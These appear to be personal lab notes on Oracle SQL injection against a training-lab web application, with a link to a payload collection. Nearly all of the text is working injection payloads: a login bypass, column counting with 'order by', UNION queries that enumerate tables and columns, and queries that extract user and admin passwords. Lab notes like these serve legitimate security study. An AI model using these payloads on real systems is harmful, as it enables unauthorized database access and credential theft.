<https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md>

Determine the number of columns:
' order by 1--
' order by 2--
' order by 3--
(Go until it it errors out. Now you know how many columns there are.)

<http://10.11.1.222:8080/blog/>
' or 1=1 --

<http://10.11.1.222:8080/blog/home.jsp>

(there's 3 columns)
' order by 1--
' order by 2--
' order by 3--
' order by 4-- (errors out here)


(something lol)
' UNION select 'a', + 'a' from DUAL--

(lists names of tables)
' UNION SELECT NULL, table_name, NULL FROM all_tables--

(lists names of columns inside set table)
' UNION SELECT NULL, column_name, NULL FROM all_tab_columns WHERE table_name = 'WEB_USERS'--
' UNION SELECT NULL, column_name, NULL FROM all_tab_columns WHERE table_name = 'WEB_ADMINS'--

(lists information inside of set column inside set table)
' UNION select USER_NAME, NULL, NULL from WEB_USERS --

' UNION select PASSWORD, NULL, NULL from WEB_USERS --

' UNION select PASSWORD, ADMIN_NAME, ADMIN_ID from WEB_ADMINS --

![unnamed_ce34f16358a8471a90b1d58454e005da](unnamed_ce34f16358a8471a90b1d58454e005da.png)
![unnamed_57c419f9fc344ebe910e4dd21614afc1](unnamed_57c419f9fc344ebe910e4dd21614afc1.png)